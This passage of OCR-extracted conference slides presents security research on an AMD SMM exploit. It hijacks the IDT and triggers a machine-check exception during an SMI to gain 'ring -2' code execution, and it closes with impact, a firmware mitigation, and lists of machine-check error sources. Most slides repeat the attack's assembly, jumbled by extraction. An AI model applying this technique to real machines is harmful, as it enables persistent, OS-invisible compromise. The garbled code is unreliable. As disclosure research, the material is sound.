North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 225

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 226

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 227

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 228

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 229

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 230

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 231

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 232

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
UR MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
mov rax, SmiRendezvous
movq (0xf8013ff9), %rax RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
CpuRdDatErr
Hijack IDT
SMI#

## Slide 233

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
thread 0 (victim) ...
mov eax, 0x668
movq $0x92, %%rcx mov cl, 0
I/O  RAM
cmp cl, 0
loop .
Device je 3f
outb %%al, $0xb2 bts eax, 12
nop mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
UR MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device
(install hijack IDT) ...
mov rcx, rbx
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm
SMI#
CpuRdDatErr
SMI#

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
…
ffffffffc0197da0
…
OS IDT
Hijack IDT

push %%rax push %%rdi push %%rsi call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 234

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
thread 0 (victim) ...
mov eax, 0x668
movq $0x92, %%rcx mov cl, 0
I/O  RAM
cmp cl, 0
loop .
Device je 3f
outb %%al, $0xb2 bts eax, 12
nop mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
UR MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device
(install hijack IDT) ...
mov rcx, rbx
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm
SMI#
CpuRdDatErr
SMI#

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
…
ffffffffc0197da0
…
OS IDT
Hijack IDT

push %%rax push %%rdi push %%rsi call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 235

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
thread 0 (victim) ...
mov eax, 0x668
movq $0x92, %%rcx mov cl, 0
I/O  RAM
cmp cl, 0
loop .
Device je 3f
outb %%al, $0xb2 bts eax, 12
nop mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
UR MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device
(install hijack IDT) ...
mov rcx, rbx
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm
SMI#
CpuRdDatErr
SMI#

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
…
ffffffffc0197da0
…
OS IDT
Hijack IDT

push %%rax push %%rdi push %%rsi call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 236

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
thread 0 (victim) ...
mov eax, 0x668
movq $0x92, %%rcx mov cl, 0
I/O  RAM
cmp cl, 0
loop .
Device je 3f
outb %%al, $0xb2 bts eax, 12
nop mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North  MC#
CPU mov rbx, cr0
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
UR MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device
(install hijack IDT) ...
mov rcx, rbx
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm
SMI#
CpuRdDatErr
SMI#

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
…
ffffffffc0197da0
…
OS IDT
Hijack IDT

push %%rax push %%rdi push %%rsi call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 237

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 238

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 239

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
movq (0xf8013ff9), %rax mov rax, SmiRendezvous RAM call smm_mce_handler
call rax
pop %%rsi
add   rsp, 0x20
pop %%rdi
fxrstor64 [rsp]
pop %%rax
... iretq
rsm
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 240

thread 0 (victim)
movq $0x92, %%rcx
I/O  RAM
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
SMI#

… ffffffffc0b2ed80 ffffffffc0b2edc0 ffffffffc0b2ee40 … RAM push %%rax push %%rdi push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq … MMIO ffffffffc0197da0 … push %%rax push %%rdi push %%rsi RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 241

thread 0 (victim)
movq $0x92, %%rcx
I/O  RAM
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
SMI#

… ffffffffc0b2ed80 ffffffffc0b2edc0 ffffffffc0b2ee40 … RAM push %%rax push %%rdi push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq … MMIO ffffffffc0197da0 … push %%rax push %%rdi push %%rsi RAM call smm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 242

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT

## Slide 243

(demo)

the exploit.

## Slide 244

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deltaop@ubuntu-usb-3:~/_research$ []
```

## Slide 245

⊷Arbitrary code execution with SMM privileges

- ⊸ “ring -2”

- ⊸ Invisible to operating system, hypervisor, etc.

- ⊸ Can preempt OS, hypervisor, etc.

- ⊸ Critical to platform security, server RAS, client miscellanea

- ⊸ Firmware R/W access in many configurations

impact

## Slide 246

⊷Malicious IDT allowed in SMM, on all AMD CPUs ⊷MCE, developed on pre-Zen

mitigation

## Slide 247

⊷Firmware mitigation of SMM MCE path ⊸ EDK2 SMM code is correct, but assumes IDT made safe by microcode ⊸ On platforms leaving IDT in untrusted state, EDK2 should be changed to mitigate MCE threat ⊸ Submitted patch to remove MCE vector

mitigation

## Slide 248

⊷IDT issue remains

⊸ `try { main() } except { pop_shell() }`

mitigation

## Slide 249

⊷Machine checks are powerful, but have never been explored for exploitation

# future research

## Slide 250

⊷Other sources of MCEs

future research

## Slide 251

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” "LS0 Exit Error” "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error" "LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 252

"MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error” "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error” "Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error” "Rx Replay Timeout Error” "LinkSub Tx Timeout Error” "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" ⊷Other sources of MCEs "RAM ECC Error" "ARC instruction buffer parity error” "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0” "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error” "Data Startup Limit Error” 